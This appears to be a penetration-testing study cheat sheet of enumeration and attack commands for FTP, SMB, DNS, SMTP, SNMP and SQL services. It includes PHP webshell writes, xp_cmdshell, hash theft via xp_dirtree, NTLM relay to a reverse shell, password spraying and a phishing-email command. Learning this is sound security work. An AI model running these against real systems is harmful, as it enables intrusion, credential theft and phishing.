# FootPrinting
- [FTP](#ftp)
- [SMB](#smb)
    - [Attacking SMB](#attacking-smb)
- [NFS](#nfs)
- [DNS](#DNS)
    - [Attacking DNS](#attacking-dns)
- [SMTP](#smtp)
    - [Attacking SMTP](#attacking-smtp)
- [IMAP / POP3](#imap--pop3)
- [SNMP](#snmp)
- [MySQL](#mysql)
- [MSSQL](#mssql)
- [Oracle TNS](#oracle-tns)
- [SQL Databases](#sql-databases)
    - [SQL Syntax](#sql-syntax)
        - [Basics](#basics)
        - [Execute Commands](#execute-commands)
        - [Write Local Files](#write-local-files)
        - [Read Local Files](#read-local-files)
    - [Capture MSSQL Service Hash](#capture-mssql-service-hash)
    - [Impersonate Existing Users with MSSQL](#impersonate-existing-users-with-mssql)
    - [Communicate with Other Databases with MSSQL](#communicate-with-other-databases-with-mssql)
- [IPMI](#ipmi)
- [Attacking RDP](#attacking-rdp)
- [Remote Management Protocols](#remote-management-protocols)
    - [Linux Remote Management Protocols](#linux-remote-management-protocols)
        - [SSH](#ssh)
        - [Rsync](#rsync)
        - [R-Services](#r-services)
    - [Windows Remote Management Protocols](#windows-remote-management-protocols)
        - [RDP](#rdp)
        - [WinRM](#winrm)
        - [WMI](#wmi)



## FTP
- Control channel through `TCP port 21` and the data channel via `TCP port 20`.
- Trivial File Transfer Protocol (TFTP) is simpler than FTP.
    - It does not provide user authentication and other valuable features supported by FTP.
    - TFTP uses UDP.
    - TFTP does not have directory listing functionality.
- `vsFTPd` is one of the most used FTP servers on Linux-based distributions.
    - Default configuration file `/etc/vsftpd.conf`
    - Deny users access to the FTP service by this file`/etc/ftpusers`
    - Get overview of the server's settings `ftp> status`
    - If the `hide_ids=YES` setting is present, the UID and GUID representation of the service will be overwritten.
    - `ls_recurse_enable=YES` allows us to see all the visible content at once `ls -R`
    - Use `get` to Download files
    - Download all the files and folders we have access to at once:`wget -m --no-passive ftp://anonymous:anonymous@TARGET_IP` 
    - `PUT` command, we can upload files in the current folder to the FTP server.

- We can use other application to interact with ftp service:
```
nc -nv TARGET_IP 21
telnet TARGET_IP 21
```

- If the FTP server runs with TLS/SSL encryption, we can use the client openssl and communicate with the FTP server `openssl s_client -connect TARGET_IP:21 -starttls ftp`

- [ ] Check for Anonymous Login
- [ ] Check if we have the permissions to upload files to the FTP server
- [ ] Try bruteforcing with medusa `medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp `
- [ ] Nmap
    - [ ] Scanning TCP port 21 `sudo nmap -sV -p21 -sC -A TARGET_IP`
    - [ ] Scanning with Nmap Scripts `find / -type f -name ftp* 2>/dev/null | grep scripts`
    - [ ] `-b` flag can be used to perform an FTP bounce attack: `nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`
- [ ] Check for CoreFTP before build 727 vulnerability assigned CVE-2022-22836.Exploitation: `curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops`


> [!TIP]
> Trace the progress of NSE scripts at the network level if we use the `--script-trace` option


## SMB 
- Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port 139 and UDP ports 137 and 138.
- With Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port 445 without the extra NetBIOS layer.
- Samba: is a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.
    - Samba implements the Common Internet File System (CIFS) network protocol.
    - When we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over `TCP ports 137, 138, 139`
    - CIFS uses `TCP port 445`
    - Default Configuration file `/etc/samba/smb.conf`
    - Connecting to the server's share with null session `smbclient -N -L //TARGET_IP`
    - Shares that ended with `$` are already included by default in the basic setting
    - We can see who, from which host, and which share the client is connected `sudo smbstatus`
- Smbclient allows us to execute local system commands using an exclamation mark at the beginning `(!<cmd>)`

### **Dangerous Settings**

|Setting|	Description      |
|:------|:------------------|
|browseable = yes|	Allow listing available shares in the current share?|
|read only = no|	Forbid the creation and modification of files?|
|writable = yes|	Allow users to create and modify files?|
|guest ok = yes|	Allow connecting to the service without using a password?|
|enable privileges = yes|	Honor privileges assigned to specific SID?|
|create mask = 0777|	What permissions must be assigned to the newly created files?|
|directory mask = 0777|	What permissions must be assigned to the newly created directories?|
|logon script = script.sh|	What script needs to be executed on the user's login?|
|magic script = script.sh|	Which script should be executed when the script gets closed?|
|magic output = script.out|	Where the output of the magic script needs to be stored?|


- **RPCclient**: is a tool to perform MS-RPC functions. RPCclient important functions:

|Query|	Description|
|:----|:-----------|
|`srvinfo`|	Server information.|
|`enumdomains`|	Enumerate all domains that are deployed in the network.|
|`querydominfo`|	Provides domain, server, and user information of deployed domains.|
|`netshareenumall`|	Enumerates all available shares.|
|`netsharegetinfo <share>`|	Provides information about a specific share.|
|`enumdomusers`|	Enumerates all domain users.|
|`queryuser <RID>`|	Provides information about a specific user.|

> [!TIP]
> Brute Forcing User RIDs
> `for i in $(seq 500 1100);do rpcclient -N -U "" TARGET_IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done`.
> We can also use Python script from Impacket called [samrdump.py](https://github.com/fortra/impacket/blob/master/examples/samrdump.py).
> `samrdump.py TARGET_IP`

- Alternatives for RPCclient are [SMBmap](https://github.com/ShawnDEvans/smbmap) , [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) and [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) 
- **SMBmap**:
    - `smbmap -H TARGET_IP `
    - We can browse the directories: `smbmap -H 10.129.14.128 -r notes`
    - Download file: `smbmap -H 10.129.14.128 --download "notes\note.txt"`
    - Upload file: `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`
- **CrackMapExec**
    - `crackmapexec smb TARGET_IP --shares -u '' -p ''`
    - Enumerating Logged-on Users: `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`
    


- `./enum4linux-ng.py TARGET_IP -A -C`



- [ ] Check for Null session 
- [ ] RPCclient
    - [ ] `rpcclient -U '%' TARGET_IP`
- [ ] enum4linux-ng 
- [ ] Nmap
    - [ ] Scanning 139,445 ports `sudo nmap TARGET_IP -sV -sC -p139,445`
    - [ ] Scanning with Nmap Scripts `find / -type f -name smb* 2>/dev/null | grep scripts`

- **Server Message Block (SMB) with Windows**: 
    - Navigate share using GUI. We can press [WINKEY] + [R] to open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`
    - Using CMD:
        - To list subdirectory and files `C:\htb> dir \\192.168.220.129\Finance\`
        - We can connect to a file share with the following command and map its content to the drive letter n: `C:\htb> net use n: \\192.168.220.129\Finance`. We can also provide a username and password to authenticate to the share: `C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123`
        - To know how many files the shared folder and its subdirectories contain (drive letter n): `C:\htb> dir n: /a-d /s /b | find /c ":\"`
        - Search about secrets in the share: 
        ```
        C:\htb>dir n:\*cred* /s /b

        n:\Contracts\private\credentials.txt


        C:\htb>dir n:\*secret* /s /b

        n:\Contracts\private\secret.txt
        ```
        - Search for a specific word within a text file: `c:\htb>findstr /s /i cred n:\*.*`
    - Using Poweshell:
        - To list subdirectory and files `PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\`
        - Instead of net use, we can use New-PSDrive in PowerShell: `PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"`
        - To provide a username and password with Powershell, we need to create a PSCredential object:
        ```
        PS C:\htb> $username = 'plaintext'
        PS C:\htb> $password = 'Password123'
        PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
        PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
        PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
        ```
        - We can use the command Get-ChildItem or the short variant gci instead of the command dir: `PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count`
        - Search about secrets in the share: `PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File`
        - We can use Select-String similar to grep in UNIX or findstr.exe in Windows: `PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List`

- **Server Message Block (SMB) with Linux**: 
    - Mount the share: 
    ```
    abdeonix@htb[/htb]$ sudo mkdir /mnt/Finance
    abdeonix@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
    ```
    - Search about secrets: `abdeonix@htb[/htb]$ find /mnt/Finance/ -name *cred*`, `abdeonix@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred`

### Attacking SMB

- **Impacket PsExec**
    - To connect to a remote machine with a local administrator account, using impacket-psexec, you can use the following command: `impacket-psexec administrator:'Password123!'@10.10.110.17`

- **CrackMapExec**
    - Password Spraying: `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`
    - Execute Commands: `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
    - Extract Hashes from SAM Database: `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`
    - Pass-the-Hash (PtH): `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`


> [!NOTE]
> Using the `--continue-on-success` flag, It will continue spraying even after a valid password is found.
> If we are targeting a non-domain joined computer, we will need to use the option `--local-auth`.

#### Forced Authentication Attacks
- We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes.
- The most common tool to perform such operations is the Responder. 
- Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes.
- **Steps**
    - Creating a fake SMB server using the Responder default configuration, with the following command: `responder -I <interface name>`
    - Crack it using the hashcat module 5600.
    - If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) or [Responder MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py).
        1. We need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf): `cat /etc/responder/Responder.conf | grep 'SMB ='`
        2. We execute impacket-ntlmrelayx with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`: `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
        3. We can execute commands by adding the option `-c` and get a [reverse shell](https://www.revshells.com/): `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'REV_SHELL'`

- [ ] Check for [SMBGhost](https://www.exploit-db.com/exploits/48537) Vulnerability  


## NFS
- NFS has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local.
- NFS is used between Linux and Unix systems.
- NFSv4 uses only one UDP or `TCP port 2049` to run the service.
- Default configuration file `/etc/exports`
- `insecure` option is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root.

### **Dangerous Settings**

|Option|	Description        |
|:------|:---------------------|
|rw|	Read and write permissions.|
|insecure|	Ports above 1024 will be used.|
|nohide|	If another file system was mounted below an exported directory, this directory is exported by its own exports entry.|
|no_root_squash|	All files created by root are kept with the UID/GID 0.|



- [ ] Check available NFS shares `showmount -e TARGET_IP`
    - [ ] Mount availabe shares if found
    ```
    mkdir target-NFS
    sudo mount -t nfs TARGET_IP:/ ./target-NFS/ -o nolock
    ```
    - [ ] After we have done we can unmount the NFS share `sudo umount ./target-NFS`
- [ ] Nmap
    - [ ] `sudo nmap TARGET_IP -p111,2049 -sV -sC`
    - [ ] `sudo nmap --script nfs* TARGET_IP -sV -p111,2049`

## DNS 
- DNS servers work with three different types of configuration files:
    - local DNS configuration files
    - zone files
    - reverse name resolution files

- The DNS server Bind9 is very often used on Linux-based distributions. 
    -  Its local configuration file `/etc/bind/named.conf`
    -  The local configuration files are usually:
        - named.conf.local
        - named.conf.options
        - named.conf.log

### **Dangerous Settings**

|Option|	Description|
|:-------|:--------------|
|allow-query|	Defines which hosts are allowed to send requests to the DNS server.|
|allow-recursion|	Defines which hosts are allowed to send recursive requests to the DNS server.|
|allow-transfer|	Defines which hosts are allowed to receive zone transfers from the DNS server.|
|zone-statistics|	Collects statistical data of zones.|


> [!TIP]
> Subdomain Brute forcing `for sub in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @TARGET_IP | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done`. 
> Another tool work in the same way: `dnsenum --dnsserver TARGET_IP --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb`

- Subdomain Enumeration: 
    - We can use subfinder or subbrute
    ```
    abdeonix@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
    abdeonix@htb[/htb]$ cd subbrute
    abdeonix@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
    abdeonix@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt
    ```
- Tools like [Fierce](https://github.com/mschwager/fierce) can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer: `fierce --domain zonetransfer.me`



- [ ] dig
    - [ ] `dig ns inlanefreight.htb @TARGET_IP`
    - [ ]  Query a DNS server's version `dig CH TXT version.bind TARGET_IP`
    - [ ] `dig any inlanefreight.htb @TARGET_IP`
    - [ ] AXFR Zone Transfer: `dig axfr inlanefreight.htb @TARGET_IP`
- [ ] Nmap
    - [ ] `nmap -p53 -Pn -sV -sC 10.10.110.213`
### Attacking DNS
- **DNS Spoofing**
- Local DNS Cache Poisoning
    - perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).

- **Ettercap Steps**
    1. Edit the `/etc/ettercap/etter.dns` file to map the target domain name with our IP 
    2. Start the Ettercap tool and scan for live hosts within the network by navigating to Hosts > Scan for Hosts.
    3. Add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
    4. Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to ATTACKER_IP


## SMTP
- SMTP is often combined with the IMAP or POP3 protocols.
- SMTP servers accept connection requests on `port 25`.Newer SMTP servers also use other ports such as `TCP port 587`.
- Default configuration file `/etc/postfix/main.cf`
- To interact with the SMTP server, we can use the telnet tool to initialize a TCP connection with the SMTP server.
- `telnet TARGET_IP 25`

- [ ] Nmap 
    - [ ] `sudo nmap TARGET_IP -sC -sV -p25` 
    - [ ] `sudo nmap TARGET_IP -p25 --script smtp-open-relay -v`
- [ ] Host
    - [ ] `host -t MX hackthebox.eu`
    - [ ] `host -t A mail1.inlanefreight.htb.`
- [ ] Dig
    - [ ] `dig mx plaintext.do | grep "MX" | grep -v ";"`

|Command|	Description|
|:------|:-------------|
|AUTH PLAIN|	AUTH is a service extension used to authenticate the client.|
|HELO|	The client logs in with its computer name and thus starts the session.|
|MAIL FROM|	The client names the email sender.|
|RCPT TO|	The client names the email recipient.|
|DATA|	The client initiates the transmission of the email.|
|RSET|	The client aborts the initiated transmission but keeps the connection between client and server.|
|VRFY|	The client checks if a mailbox is available for message transfer.|
|EXPN|	The client also checks if a mailbox is available for messaging with this command.|
|NOOP|	The client requests a response from the server to prevent disconnection due to time-out.|
|QUIT|	The client terminates the session.|

### Attacking SMTP
- Enumerate the following ports:

|Port|	Service|
|:---|:--------|
|TCP/25|	SMTP Unencrypted|
|TCP/143|	IMAP4 Unencrypted|
|TCP/110|	POP3 Unencrypted|
|TCP/465|	SMTP Encrypted|
|TCP/587|	SMTP Encrypted/STARTTLS|
|TCP/993|	IMAP4 Encrypted|
|TCP/995|	POP3 Encrypted|

```bash
# Nmap 
$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

```

- Enumerate users [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum).
```bash
[!bash!]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

```

- **Cloud Enumeration**
    - [O365 Spray](https://github.com/0xZDH/o365spray)
    ```bash
    [!bash!]$ python3 o365spray.py --validate --domain msplaintext.xyz

    [!bash!]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz    

    ```

- **Password Attacks**
    - Hydra - Password Attack
    ```bash
    [!bash!]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
    ```
    - If we are blocked we can use custom tools like [O365 Spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta 

    - O365 Spray - Password Spraying
    ```bash
    [!bash!]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
    ```

- **Protocol Specific Attacks - Open Relay**
    - An open relay is an improperly configured SMTP server that allows unauthenticated email relays, enabling attackers to send emails that appear to originate from the server. 
    - This can be exploited for phishing by spoofing legitimate email addresses. 
    - Attackers can use tools like `nmap smtp-open-relay` to identify vulnerable servers and send deceptive emails containing malicious links.

    ```bash
    [!bash!]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

    [!bash!]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

    ```


## IMAP / POP3
- Internet Message Access Protocol (IMAP) allows online management of emails directly on the server and supports folder structures. , Post Office Protocol (POP3) only provides listing, retrieving, and deleting emails as functions at the email server.

- By default, ports 110 and 995 are used for POP3, and ports 143 and 993 are used for IMAP.

- IMAP Commands

| Command                  | Description                                                                                       |
|--------------------------|---------------------------------------------------------------------------------------------------|
| 1 LOGIN username password | User's login.                                                                                     |
| 1 LIST "" *               | Lists all directories.                                                                            |
| 1 CREATE "INBOX"          | Creates a mailbox with a specified name.                                                          |
| 1 DELETE "INBOX"          | Deletes a mailbox.                                                                                |
| 1 RENAME "ToRead" "Important" | Renames a mailbox.                                                                            |
| 1 LSUB "" *               | Returns a subset of names from the set of names that the user has declared as being active or subscribed. |
| 1 SELECT INBOX            | Selects a mailbox so that messages in the mailbox can be accessed.                                |
| 1 UNSELECT INBOX          | Exits the selected mailbox.                                                                       |
| 1 FETCH 1 BODY[]          | Retrieves data associated with a message in the mailbox.                                          |
| 1 CLOSE                   | Removes all messages with the Deleted flag set.                                                   |
| 1 LOGOUT                  | Closes the connection with the IMAP server.                                                       |

- POP3 Commands

| Command          | Description                                              |
|------------------|----------------------------------------------------------|
| USER username    | Identifies the user.                                      |
| PASS password    | Authentication of the user using its password.            |
| STAT             | Requests the number of saved emails from the server.      |
| LIST             | Requests from the server the number and size of all emails.|
| RETR id          | Requests the server to deliver the requested email by ID. |
| DELE id          | Requests the server to delete the requested email by ID.  |
| CAPA             | Requests the server to display the server capabilities.   |
| RSET             | Requests the server to reset the transmitted information. |
| QUIT             | Closes the connection with the POP3 server.               |

### **Dangerous Settings**

|Setting|	Description   |
|:------|:----------------|
|auth_debug|	Enables all authentication debug logging.|
|auth_debug_passwords|	This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.|
|auth_verbose|	Logs unsuccessful authentication attempts and their reasons.|
|auth_verbose_passwords	|Passwords used for authentication are logged and can also be truncated.|
|auth_anonymous_username|	This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.|


- [ ] Nmap
    - [ ] `sudo nmap TARGET_IP -sV -p110,143,993,995 -sC`
- [ ] `curl -k 'imaps://TARGET_IP' --user user:p4ssw0rd`
- [ ] Openssl
    - [ ] `openssl s_client -connect TARGET_IP:pop3s`
    - [ ] `openssl s_client -connect TARGET_IP:imaps`

## SNMP
- Simple Network Management Protocol (SNMP) was created to monitor network devices. 
- It can also be used to handle configuration tasks and change settings remotely.
- SNMP also transmits control commands using agents over UDP port `161`.
- SNMP enables the use of so-called traps over UDP port `162`.
- SNMPv1
    - SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify network data.
    - Main flaw of SNMPv1 is that it does not support encryption, meaning that all data is sent in plain text and can be easily intercepted.
- SNMPv2
    - The version still exists today is v2c, and the extension c means community-based SNMP.
- SNMPv3
    - The security has been increased enormously for SNMPv3 by security features such as authentication using username and password

- **Community strings** can be seen as passwords that are used to determine whether the requested information can be viewed or not.
- **MIB (Management Information Base)**: A MIB is like a directory of all the things you can monitor or control on a device. It’s a text file that organizes these items in a hierarchy, and each item has a unique identifier called an OID (Object Identifier).

- **OID (Object Identifier)**: This is a unique code (like a serial number) that points to specific data or settings in a device. OIDs help identify what you’re trying to monitor or control.

- Default Configuration file `/etc/snmp/snmpd.conf`

### Dangerous Settings
- Some dangerous settings that the administrator can make with SNMP are:

|Settings	|     Description        |
|:----------|:-----------------------|
|`rwuser noauth`|	Provides access to the full OID tree without authentication.|
|`rwcommunity <community string> <IPv4 address>`|	Provides access to the full OID tree regardless of where the requests were sent from.|
|`rwcommunity6 <community string> <IPv6 address>`|	Same access as with rwcommunity with the difference of using IPv6.|

- We can use Onesixtyone can be used to brute-force the names of the community strings

- [ ] Onesixtyone
    - [ ] `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET_IP`

> [!TIP]
> We can use [crunch](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create a custom wordlist.
> After we know community string, we can use braa tool to brute-force the individual OIDs and enumerate the information behind them: `braa <community string>@<IP>:.1.3.6.*   # Syntax`. e.g. `braa public@10.129.14.128:.1.3.6.*`

- [ ] snmpwalk
    - [ ] `snmpwalk -v2c -c public TARGET_IP`

## SQL Databases
- **Connnecting to the MySQL server:**
    - `mysql -u julio -pPassword123 -h 10.129.20.13`
    - `C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30`

- **Connecting to the MSSQL server:**
    - `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`. `-h` to disable headers and footers for a cleaner look.
    - `mssqlclient.py -p 1433 julio@10.129.203.7 `

> [!NOTE]
> When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use SERVERNAME\\accountname or .\\accountname. The full command would look like: `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`


### SQL Syntax
#### Basics
- Show Databases
    - `mysql> SHOW DATABASES;` , 
    - If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax: 
    ```SQL
    1> SELECT name FROM master.dbo.sysdatabases
    2> GO
    ```
- Select a Database
    - `mysql> USE htbusers;`
    ```SQL
    1> USE htbusers
    2> GO
    ```
- Show Tables
    - `mysql> SHOW TABLES;`
    ```SQL
    1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
    2> GO
    ```
- Select all Data from Table "users"
    - `mysql> SELECT * FROM users;`
    ```SQL
    1> SELECT * FROM users
    2> go
    ```

#### Execute Commands
- **XP_CMDSHELL**
    ```SQL
    1> xp_cmdshell 'whoami'
    2> GO

    output
    -----------------------------
    no service\mssql$sqlexpress
    NULL
    (2 rows affected)
    ```
    - If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
    ```SQL
    -- To allow advanced options to be changed.  
    EXECUTE sp_configure 'show advanced options', 1
    GO

    -- To update the currently configured value for advanced options.  
    RECONFIGURE
    GO  

    -- To enable the feature.  
    EXECUTE sp_configure 'xp_cmdshell', 1
    GO  

    -- To update the currently configured value for this feature.  
    RECONFIGURE
    GO
    ```

> [!TIP]
> There are other methods to get command execution, such as adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts. 
> `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.

> [!TIP]
> MySQL supports User Defined Functions which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys).

#### Write Local Files
- **MySQL**
    - MySQL does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands: `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';`

    - In MySQL, a global system variable `secure_file_priv` limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the `LOAD_FILE()` function. These operations are permitted only to users who have the FILE privilege.

    - secure_file_priv may be set as follows:

        - If empty, the variable has no effect, which is not a secure setting.
        - If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
        - If set to NULL, the server disables import and export operations.
    ```SQL
    mysql> show variables like "secure_file_priv";

    ```
- **MSSQL**
    - To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
    ```SQL
    1> sp_configure 'show advanced options', 1
    2> GO
    3> RECONFIGURE
    4> GO
    5> sp_configure 'Ole Automation Procedures', 1
    6> GO
    7> RECONFIGURE
    8> GO
    ```
    - Create a File:
    ```SQL
    1> DECLARE @OLE INT
    2> DECLARE @FileID INT
    3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
    4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
    5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
    6> EXECUTE sp_OADestroy @FileID
    7> EXECUTE sp_OADestroy @OLE
    8> GO
    ```

#### Read Local Files
- **MySQL**
    - By default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:`mysql> select LOAD_FILE("/etc/passwd");`
- **MSSQL**
    ```SQL
    1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
    2> GO
    ```

### Capture MSSQL Service Hash
- We can steal the MSSQL service account hash using xp_subdirs or xp_dirtree undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system


```SQL
# XP_DIRTREE Hash Stealing
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

# XP_SUBDIRS Hash Stealing
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

# XP_SUBDIRS Hash Stealing with Responder
sudo responder -I tun0

# XP_SUBDIRS Hash Stealing with impacket
sudo impacket-smbserver share ./ -smb2support
```

### Impersonate Existing Users with MSSQL
- SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.
- **Steps**
    1. Identify Users that We Can Impersonate
    ```SQL
    1> SELECT distinct b.name
    2> FROM sys.server_permissions a
    3> INNER JOIN sys.server_principals b
    4> ON a.grantor_principal_id = b.principal_id
    5> WHERE a.permission_name = 'IMPERSONATE'
    6> GO
    ```
    2. Verifying our Current User and Role
    ```SQL
    1> SELECT SYSTEM_USER
    2> SELECT IS_SRVROLEMEMBER('sysadmin')
    3> go
    ```
    3. Impersonating a User
    ```SQL
    1> EXECUTE AS LOGIN = 'USER'
    2> SELECT SYSTEM_USER
    3> SELECT IS_SRVROLEMEMBER('sysadmin')
    4> GO
    ```
> [!NOTE]
> It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

> [!TIP]
> If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

### Communicate with Other Databases with MSSQL
- MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
- If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server.
- **Steps**
    1. Identify linked Servers in MSSQL: 
    ```SQL
    1> SELECT srvname, isremote FROM sysservers
    2> GO
    ```
    2. Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).
    ```SQL
    1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
    2> GO
    ```

> [!NOTE]
>  If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).


## MySQL
- MySQL works according to the client-server principle and consists of a MySQL server and one or more MySQL clients.
- Configuration file `/etc/mysql/mysql.conf.d/mysqld.cnf`
- Usually, the MySQL server runs on TCP port 3306.

- **MySQL Commands**

|                      Command                 | 	Description      |
|:---------------------------------------------|:--------------------|
|`mysql -u <user> -p<password> -h <IP address>`|	Connect to the MySQL server. There should not be a space between the '-p' flag, and the password.|
|`show databases;`                             |	Show all databases.|
|`use <database>;`                             |	Select one of the existing databases.|
|`show tables;`                                |	Show all available tables in the selected database.|
|`show columns from <table>;`                  |	Show all columns in the selected database.|
|`select * from <table>;`                      |	Show everything in the desired table.|
|`select * from <table> where <column> = "<string>";`|	Search for needed string in the desired table.|

### Dangerous Settings

|Settings|	Description     |
|:--------|:----------------|
|user|	Sets which user the MySQL service will run as.|
|password|	Sets the password for the MySQL user.|
|admin_address|	The IP address on which to listen for TCP/IP connections on the administrative network interface.|
|debug|	This variable indicates the current debugging settings|
|sql_warnings|	This variable controls whether single-row INSERT statements produce an information string if warnings occur.|
